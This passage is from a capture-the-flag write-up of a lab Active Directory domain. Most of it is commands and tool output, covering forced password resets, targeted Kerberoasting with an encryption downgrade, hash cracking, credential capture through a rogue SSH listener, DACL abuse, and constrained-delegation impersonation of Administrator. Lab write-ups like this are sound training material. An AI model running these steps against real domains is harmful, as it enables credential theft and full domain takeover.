  set object 'CN=oscar.mazerath,OU=IT-Tier1,DC=hsm-defense,DC=local' \
  distinguishedName -v 'CN=oscar.mazerath,OU=IT-Tier3,DC=hsm-defense,DC=local'
```

Once in IT-Tier3, the CONTAINER_INHERIT GenericAll ACE grants us full control.

### Reset oscar.mazerath's Password

```
bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -k \
  set password oscar.mazerath 'Pwned123@!'
```

Authenticate:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense]─[10.200.96.99]
└──╼ $ nxc smb -k DC.hsm-defense.local -u oscar.mazerath -p 'Password123!' --shares
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\oscar.mazerath:Password123!```
```
---

## 11. Targeted Kerberoasting on ryan.cole

`oscar.mazerath` holds **GenericWrite** over `ryan.cole`. We perform a Targeted Kerberoast:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast]─[10.200.96.99]
└──╼ $ python3 targetedKerberoast.py -k --dc-host dc.hsm-defense.local -u 'oscar.mazerath' \
  -d 'hsm-defense.local' --request-user 'ryan.cole'
[*] Starting kerberoast attacks
[*] Attacking user (ryan.cole)
[+] Printing hash for (ryan.cole)
$krb5tgs$23$*ryan.cole$HSM-DEFENSE.LOCAL$hsm-defense.local/ryan.cole*$007a269397b37fdf9e9a4092eee451af$1dc551300a5123975efe5642384ddcc4a80b23d8b49aa4a295271ab15766be90f83a9dc9993d517dea3eee0c82d1314d4f51fe639dcf3d7c6f9458b97d14d614aea7ae1823aa5147bf5ed00d07508f16282da69137ec8e10ea5bc55241df7850a9b3567a0804e5a42d1a64271d5f7d83d1d5fbb895a4b351d3f55404f4e896db1eae1514664c63414c7b10c770e4b3dadb231e8ba2413a911ae945f39bf9ebd4b6f04f094e6572613272deadfe33f0991a0277a2fa69b66e56d3e5f8750cc635032833bb5d3a3b0357f48f4f930f8af1bc667eb29c064c51d4f40ab48782735a29a46465cd520702ac66496d329758b68f5dd5b493eccf07b44e35189fe74e71e971ef66ce573206717d96441e89628fd40fc8fef32f075c7c679824d895d8ef4f301d71cd65379c6d221c34da6b1a043894383f31198eda0451be5fde1d5de72b400ae67f9b6799fa3a803b336d1fce111d33d75b1f9ccde97d01b07e137c24b9b5c1ac9863614bb630a2cfcc50e6a5b62c0344c3fae50d5851afb1156509fe942ca1e8b85a10a595778e60664db422f70893e4c4cc988a218ff2e7501418a67a109263ed3080808fd81b8e4f60e194dd2b09f49dc326ff2b526a54dbac29a9c69a506e2a4c6a3367b53cb6a0b4c3b8584775538140f16c24ac7ef063ca4745528781195d8a3fbc99f9a9660c8dc3b598f0a873475bae10e5366f50316adb6f479c25729041d7b4f1c72496275dc099e28a3c03dda4ae0eff80da9319b6d6241d6a23a6f46073049e7e728abad2c85830364dcdd3a3efb30615246b167059a43a5188e6a0139709b44fcbb4ce3709ac7d8110e4445a6c6ae9e8d6b3c5ec4872d5a00e8020e646e80a32deb98d5667a5e1077ce64b4e58ade9537f169e9a785ec0e313049bf016704a46360b93e9474ebda8e0a10219eaa06e5280cace371851a7c9467210a2773339bb571b598a57a97e676175d2bc1e11f695cb62fbe722635819e7294b40ca6cee7f7702664eb126a0083ba449010f8af6e545f464aefae5466b82f1e512cbc0e8e724fc8bf054cb7f2ce9f5870bc0a58fc1858060d405316c69beb5d9a5c9c04c7901cdd143b08afa4c1e1610d7dd4e0cb491cbf0f684d84287c1d029a37da6e71a688b44646b1228941a0cdc807f093218213d879685c05490c3b40b3cc0d3824363bd5bac36f8c5a16faf5feb5205c90fde48eef403607128537f442cd6c72bebb8b28e7446787e650f072bc9fb9554ad6aabf8d5c7b8b61e0009f2fb4eb8647f7c5d4ce09b0dc9c85ef55d6cec92fbde0a7c6168bef7e4280fc402e123d162c74193faf7f88a7098cca9ba0e808fa5a4b2308fd074ad936791b8bc5439ff8d3b80299b630bc963c33b74543c45de7574e788a7afa09c9d0b02fcd5b77a041a0b5d258f7aee81b5b465794be8321f63c63e1e9f189871c7c7155f0d5e18a5038795dd4fce9264e21891ec8a5cc5e7db644f4e9a65e1022d71f0518621724651892c0ae59dd915388982981475b16cbfc20445366d996dff2687b072e2c5ea51edb88e672c139abe1457d734a18b329494832741b52961a6e1d91f76c2854a8b8355b10267744bdc8db3dc57d0b6c7da5155f543fd22bf

```

The resulting blob is too strong to crack (AES). We downgrade the encryption types:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -k \
  set object ryan.cole msDS-SupportedEncryptionTypes -v 4
[+] ryan.cole's msDS-SupportedEncryptionTypes has been updated

```

This forces **RC4** encryption. Re-run the attack:

```
1. generate the new hash
   
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast]─[10.200.96.99]
└──╼ $ python3 targetedKerberoast.py -k --dc-host dc.hsm-defense.local -u 'oscar.mazerath'   -d 'hsm-defense.local' --request-user 'ryan.cole'
[*] Starting kerberoast attacks
[*] Attacking user (ryan.cole)
[+] Printing hash for (ryan.cole)
$krb5tgs$23$*ryan.cole$HSM-DEFENSE.LOCAL$hsm-defense.local/ryan.cole*$f853677af54d1a83e3f2deb70c4641dd$4e1f1bc9f8abc4ec8943be972e84ddba270a8a9dc495a2b02d90b2bc88b65fda83c4d6d8706ec2c0823a6b7c7023075315fbeda93e65a0d48de08c6fdb84097a876fb02600b47f3c5f7b77aa06e027b6acb54bb8779e37e46a51aa060502473445715dc43d14c9b67f10b1b8a79bd92b4f571b3d0bb83cda60916a52f6f0cdc9e119d85d2ac7a780400c7ebc058c7257b777c595ee2cf48f0483101b3d665eb21accd81e5f49cfaec62f6a3f5c5b8f34e972e5dc5cc2d76bab50b7660e4582cea8bc232bfb580b530dde45c37113d6719621e7fabe4d2d7d6f55dd8c295c81757cc28a28b762c0bee9a95f318de156ae1e242e2b96cf2d0cd8e5dc2cefcceba1b9eccf51e872b011b94c6c37ae6b5564971f2825988b4ed68c992b0a22ed1b14108fc463c2b2305c04040e12daf80c5959812cc4ce638c545606076aff8d76e8a84242d97d64142bab1891fb85e3e68ce7df2175134bcf3dc8c085478b59bc901b10c274b0b388fc9fa1475b3faf9079c674f8b62ec3978d2f39c8d05bc1f18c12a38fe53dcf1b36320a436ff2ac11a9fff2a8d9aba1ca607070fd273ca19e3487a1b9534170807fe781d7c3d5243a4d791ec4e8ab95c64efb734a4f0cb5d5ecb463d031b8448996c2b898db02a953b2c19534eb338d6015d033e576e560ec11fd9bf606eba17321fd07bdb1f848158a638df061f7b77e72fbd4b0db8be4666f38eb917c9758fd9a47d272bbbdd5cfb9f03db99a073e8d5dec2f5560a1751cb794d501a7db8c3de4456c8f92d9486ad220af6647bb3add1114043ec6aea269e1bb5814514408b2704f11b8ec79e8377c2da3a4335568783836df872ca8fb4f6c3e7ed7d515eeafec57da5d0439c613674b5d68c8e7cc784d9ec7870c404d3bd1dda37291b2c11f41908b4c4d0738566a9f398383ed87931c331e6a6c32644b8717f9f7b08088bc67f4cde8918291f0087c98cf0c7119b165890bf665104f865246ddc71bf0dd976aa8cbd62477302a94db4524c5345deae4fd645491b7464876ab13a11f31dece359f1c4fd88a1b5ee4a8817a7cfc3030e4e33f19e9fd9c0013f3f434fb5d8c2863d3404888dcc48b177d5f70c86c1d211dbe721bf4cd337652f1f4e1352c318d0cca29e109b8945083d414cb48c611d00cff7c86a90327ce61ce620b4eb9a1a4885a7b2d3102e5116723a236eecc047a98009d8cd2d461a5f0b429ea1f297d4f29e2436fb4d509d9dc7bb07e99d31e98a8a820097033e16ddd7e02a7e50cbc221d363a89eea618e74ae3834beca982a3a5503570ed2910e11979fd69e61dc2e67322cda5974af810d1c84ba4442b53c5c6ced49442af22e8daadfaefc3dce468fe65d187144be7573a794577cf4fcd2d4b5cc5ce2e5c3d16b6234a3280a7f0743641e338e9841c4df42dad2359283c9362accf390b88c7f8e2c23d4b1b84ba7cd39229c44b43fe865a55ec6aab58dfad200a20009949f0332a62cb790e90e69c5403c7777b6bde69167fa1a5a88a01369d36364e7ceb2b15459bf01a6ade76bf9dec5a995adc29864512a6d6f774126407d158c4de9dc761fa2cab40d97ac1953ecbefa43fb4c2cd88db0650b6c27d3e1839eff49bab8129e8

2. crack the hash

┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast]─[10.200.96.99]
└──╼ $ ../../hashcat/hashcat ../../hashes /usr/share/wordlists/rockyou.txt 

$krb5tgs$23$*ryan.cole$HSM-DEFENSE.LOCAL$hsm-defense.local/ryan.cole*$f853677af54d1a83e3f2deb70c4641dd$4e1f1bc9f8abc4ec8943be972e84ddba270a8a9dc495a2b02d90b2bc88b65fda83c4d6d8706ec2c0823a6b7c7023075315fbeda93e65a0d48de08c6fdb84097a876fb02600b47f3c5f7b77aa06e027b6acb54bb8779e37e46a51aa060502473445715dc43d14c9b67f10b1b8a79bd92b4f571b3d0bb83cda60916a52f6f0cdc9e119d85d2ac7a780400c7ebc058c7257b777c595ee2cf48f0483101b3d665eb21accd81e5f49cfaec62f6a3f5c5b8f34e972e5dc5cc2d76bab50b7660e4582cea8bc232bfb580b530dde45c37113d6719621e7fabe4d2d7d6f55dd8c295c81757cc28a28b762c0bee9a95f318de156ae1e242e2b96cf2d0cd8e5dc2cefcceba1b9eccf51e872b011b94c6c37ae6b5564971f2825988b4ed68c992b0a22ed1b14108fc463c2b2305c04040e12daf80c5959812cc4ce638c545606076aff8d76e8a84242d97d64142bab1891fb85e3e68ce7df2175134bcf3dc8c085478b59bc901b10c274b0b388fc9fa1475b3faf9079c674f8b62ec3978d2f39c8d05bc1f18c12a38fe53dcf1b36320a436ff2ac11a9fff2a8d9aba1ca607070fd273ca19e3487a1b9534170807fe781d7c3d5243a4d791ec4e8ab95c64efb734a4f0cb5d5ecb463d031b8448996c2b898db02a953b2c19534eb338d6015d033e576e560ec11fd9bf606eba17321fd07bdb1f848158a638df061f7b77e72fbd4b0db8be4666f38eb917c9758fd9a47d272bbbdd5cfb9f03db99a073e8d5dec2f5560a1751cb794d501a7db8c3de4456c8f92d9486ad220af6647bb3add1114043ec6aea269e1bb5814514408b2704f11b8ec79e8377c2da3a4335568783836df872ca8fb4f6c3e7ed7d515eeafec57da5d0439c613674b5d68c8e7cc784d9ec7870c404d3bd1dda37291b2c11f41908b4c4d0738566a9f398383ed87931c331e6a6c32644b8717f9f7b08088bc67f4cde8918291f0087c98cf0c7119b165890bf665104f865246ddc71bf0dd976aa8cbd62477302a94db4524c5345deae4fd645491b7464876ab13a11f31dece359f1c4fd88a1b5ee4a8817a7cfc3030e4e33f19e9fd9c0013f3f434fb5d8c2863d3404888dcc48b177d5f70c86c1d211dbe721bf4cd337652f1f4e1352c318d0cca29e109b8945083d414cb48c611d00cff7c86a90327ce61ce620b4eb9a1a4885a7b2d3102e5116723a236eecc047a98009d8cd2d461a5f0b429ea1f297d4f29e2436fb4d509d9dc7bb07e99d31e98a8a820097033e16ddd7e02a7e50cbc221d363a89eea618e74ae3834beca982a3a5503570ed2910e11979fd69e61dc2e67322cda5974af810d1c84ba4442b53c5c6ced49442af22e8daadfaefc3dce468fe65d187144be7573a794577cf4fcd2d4b5cc5ce2e5c3d16b6234a3280a7f0743641e338e9841c4df42dad2359283c9362accf390b88c7f8e2c23d4b1b84ba7cd39229c44b43fe865a55ec6aab58dfad200a20009949f0332a62cb790e90e69c5403c7777b6bde69167fa1a5a88a01369d36364e7ceb2b15459bf01a6ade76bf9dec5a995adc29864512a6d6f774126407d158c4de9dc761fa2cab40d97ac1953ecbefa43fb4c2cd88db0650b6c27d3e1839eff49bab8129e8:napalmcrack
```

Authenticate as `ryan.cole`:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast]─[10.200.96.99]
└──╼ $ nxc smb 10.1.212.125 -u ryan.cole -p 'napalmcrack'  -k
SMB         10.1.212.125    445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.1.212.125    445    DC               [+] hsm-defense.local\ryan.cole:napalmcrack 

```

---

## 12. RDP Shell as ryan.cole — SSH Tool Discovery

<img width="684" height="382" alt="image" src="https://github.com/user-attachments/assets/761c6936-606c-4c13-be93-57c20a65f04b" />


```

getTGT.py hsm-defense.local/ryan.cole:'REDACTED'
export KRB5CCNAME=$(pwd)/ryan.cole.ccache
xfreerdp /v:DC.hsm-defense.local /d:HSM-DEFENSE.LOCAL /u:ryan.cole \
  /dynamic-resolution +clipboard /cert:ignore
  
```
<img width="1186" height="882" alt="image" src="https://github.com/user-attachments/assets/0c7319d7-8fb4-4d56-a9b7-017ccc04b729" />

On the desktop, we find an email referencing an internal **SSH Remote Tool** for legacy systems, plus a shortcut to the application.

<img width="625" height="437" alt="image" src="https://github.com/user-attachments/assets/f9c122e6-6dad-4cda-a2aa-a5d935e2d68c" />


---

## 13. Capturing ITOPS01$ Credentials `https://github.com/sshlog/agent`

<img width="958" height="577" alt="image" src="https://github.com/user-attachments/assets/e9bfc769-bed8-472a-afd4-711b14e0fc02" />


The SSH tool connects to legacy systems using unencrypted SSH. We launch **SSHlog**, a credential-capturing SSH server, on our attacker machine:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ sudo ./SSHlog
[sudo] password for donmed: 
Sun, 20 Sep 2026 17:45:51 +00	STARTING SSHLOG 
Sun, 20 Sep 2026 17:45:51 +00	CREATED LOG FILE	 Filename: .ServerLog 
Sun, 20 Sep 2026 17:46:14 +00	LOGIN ATTEMPT		 Address: 10.1.212.125:50176   Client: SSH-2.0-paramiko_4.0.0   Username: ITOPS01$   Password: paSSword2459 


```

Pointing the SSH tool at our listener, we capture cleartext credentials for the machine account **ITOPS01$**.

Authenticate:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ nxc smb -k DC.hsm-defense.local -u 'ITOPS01$' -p 'paSSword2459' --shares
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\ITOPS01$:paSSword2459 ```

---

## 14. Access as svc_delegate

`ITOPS01$` holds **WriteDACL** over `svc_delegate`. We grant ourselves FullControl:

<img width="941" height="349" alt="image" src="https://github.com/user-attachments/assets/f287f799-99be-4c64-bbf8-15c78be87eb8" />


```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ getTGT.py hsm-defense.local/'ITOPS01$:paSSword2459'
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ITOPS01$.ccache
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ export KRB5CCNAME=$(pwd)/ITOPS01$.ccache
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local \
  add genericAll svc_delegate ITOPS01$
[+] ITOPS01$ has now GenericAll on svc_delegate

```

Reset the password:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local \
  set password 'svc_delegate' 'Pwned123@!'
[+] Password changed successfully!

```

Authenticate:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ nxc smb -k DC.hsm-defense.local -u 'svc_delegate' -p 'Pwned123@!' --shares
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\svc_delegate:Pwned123@! 
SMB         DC.hsm-defense.local 445    DC               [*] Enumerated shares
SMB         DC.hsm-defense.local 445    DC               Share           Permissions     Remark
SMB         DC.hsm-defense.local 445    DC               -----           -----------     ------
SMB         DC.hsm-defense.local 445    DC               ADMIN$                          Remote Admin
SMB         DC.hsm-defense.local 445    DC               C$                              Default share
SMB         DC.hsm-defense.local 445    DC               IPC$            READ            Remote IPC
SMB         DC.hsm-defense.local 445    DC               NETLOGON        READ            Logon server share 
SMB         DC.hsm-defense.local 445    DC               SYSVOL          READ            Logon server share 


```

---

## 15. Constrained Delegation → DCSync → Domain Admin

`svc_delegate` has **GenericWrite** on `HELPDESK01$`. This allows us to configure **Kerberos Constrained Delegation with Protocol Transition** on the machine account.

<img width="1048" height="444" alt="image" src="https://github.com/user-attachments/assets/ad650365-28b3-4c58-953d-9cd3327bdd21" />


### Why the Machine Account?

The S4U2Self delegation step requires a **Service Principal Name (SPN)**. Machine accounts have SPNs by default, making `HELPDESK01$` the ideal target.

### Configure Constrained Delegation

Set `msDS-AllowedToDelegateTo` to `ldap/DC.hsm-defense.local` and enable the `TRUSTED_TO_AUTH_FOR_DELEGATION` UAC flag:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ getTGT.py hsm-defense.local/'svc_delegate:Pwned123@!'
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_delegate.ccache
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ export KRB5CCNAME=svc_delegate.ccache
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ 
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local   set object HELPDESK01$ msDS-AllowedToDelegateTo -v "ldap/DC.hsm-defense.local"
[+] HELPDESK01$'s msDS-AllowedToDelegateTo has been updated


(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local \
  set object HELPDESK01$ userAccountControl -v 16781312
[+] HELPDESK01$'s userAccountControl has been updated

```

### Impersonate Administrator via S4U

Using `getST.py`, we perform S4U2Self and S4U2Proxy:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ getST.py -spn ldap/DC.hsm-defense.local -impersonate Administrator -dc-ip 10.1.212.125  'hsm-defense.local/HELPDESK01$:Password123'
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

[!] Cached TGT belongs to 'svc_delegate@HSM-DEFENSE.LOCAL', but the requested principal is 'HELPDESK01$@hsm-defense.local'. Ignoring cached TGT and requesting a new one.
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@ldap_DC.hsm-defense.local@HSM-DEFENSE.LOCAL.ccache
```

### Pass-the-Ticket

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ export KRB5CCNAME=Administrator@ldap_DC.hsm-defense.local@HSM-DEFENSE.LOCAL.ccache 

(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ nxc smb 10.1.212.125 -u Administrator k --use-kcache -X 'cat C:\Users\Administrator\Desktop\root.txt'
SMB         10.1.212.125    445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.1.212.125    445    DC               [+] hsm-defense.local\Administrator from ccache (Pwn3d!)
SMB         10.1.212.125    445    DC               [+] Executed command via wmiexec
SMB         10.1.212.125    445    DC               #< CLIXML
SMB         10.1.212.125    445    DC               FLAG[$FLAG]

```

**Root flag captured.** 

```
SMB         10.1.212.125    445    DC               FLAG[$FLAG]

```

---

## Attack Chain Summary

<img width="1024" height="1536" alt="ChatGPT Image Sep 20, 2026, 07_07_49 PM" src="https://github.com/user-attachments/assets/813957fb-6d5a-44d3-9a6f-27028f86b0d9" />

